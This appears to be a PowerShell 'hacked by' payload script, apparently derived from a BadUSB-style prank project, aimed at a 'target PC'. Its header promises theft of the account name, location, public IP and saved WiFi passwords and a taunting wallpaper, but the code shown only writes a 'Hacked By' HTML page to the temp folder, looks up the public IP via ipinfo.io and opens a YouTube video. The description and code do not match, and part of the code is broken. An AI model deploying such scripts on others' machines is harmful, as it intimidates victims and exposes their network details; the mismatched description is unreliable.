# DaVinci project by C4l4m4R@s3sin0

<#

.DESCRIPTION 
	This program gathers details from target PC to include name associated with the microsoft account, their latitude and longitude, 
	Public IP, and  and the SSID and WiFi password of any current or previously connected to networks.
	It will take the gathered information and generate a .jpg with that information on show 
	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned
	Additionally a secret message will be left in the binary of the wallpaper image generated and left on their desktop
#>
#############################################################################################################################################

# this will be the name of the image you use as the wallpaper
$userFile = "monalisa.html"

#############################################################################################################################################

<#
.NOTES  
	This will get the name associated with the microsoft account
#>

echo '<html lang="en">

<head></head>

<body style="
    background: black;
    color: white;
    text-align: center;
    margin-top: 5rem;
">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laboratory Hack</title>



    <h1>Hacked By c4l4m4R@sesin0</h1>
    <img src="https://cdn.dribbble.com/users/1238301/screenshots/3022977/davyjones.png" alt="" srcset="">
</body>

</html>' >> $Env:temp\${userFile}
echo "<h2>Your computer is not very secure</h2>" >> $Env:temp\${userFile}

#############################################################################################################################################

<#
.NOTES  
	This will get the public IP from the target computer
#>


function Get-PubIP {

    try {
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    }
    catch {
        # If no Public IP is detected function will return $null to avoid sapi speak
        # Write Error is just for troubleshooting
        Write-Error "No Public IP was detected" 
        return $null
        -ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

$PubIP = Get-PubIP
if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\${userFile} }


# rm $env:TEMP\foo.txt -r -Force -ErrorAction SilentlyContinue


#############################################################################################################################################

# clean-exfil
# Start-Process start $Env:temp\${userFile}
Start-Process "chrome.exe" "https://www.youtube.com/watch?v=wMjtO1isxVY&ab_channel=MrGninRom"

